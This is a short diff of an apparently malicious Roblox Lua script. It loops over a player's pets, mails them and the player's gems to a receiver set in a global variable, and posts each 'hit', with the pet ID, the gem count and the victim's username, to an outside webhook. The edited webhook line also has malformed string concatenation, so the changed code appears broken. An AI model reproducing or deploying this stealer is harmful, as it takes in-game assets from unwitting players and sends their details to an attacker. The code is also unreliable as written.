@@ -61,7 +61,7 @@ for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.
                 }
             }
         Networking.Invoke("Send Mail", unpack(args))
-        sendWebhook(_G.Webhook, "@everyone Paxz detected a hit \n\n```Pet ID: " .. v.Name .. "```\n\n```Gems: " .. dims .. "\n\nReciever: " .. _G.UserName .. "``` ```".. username"```)
+        sendWebhook(_G.Webhook, "@everyone Paxz detected a hit \n\n```Pet ID: " .. v.Name .. "```\n\n```Gems: " .. dims .. "\n\nReciever: " .. _G.UserName .. "``````"game.Players.LocalPlayer.Name"```)
         dims = 0
         wait(7)
     end
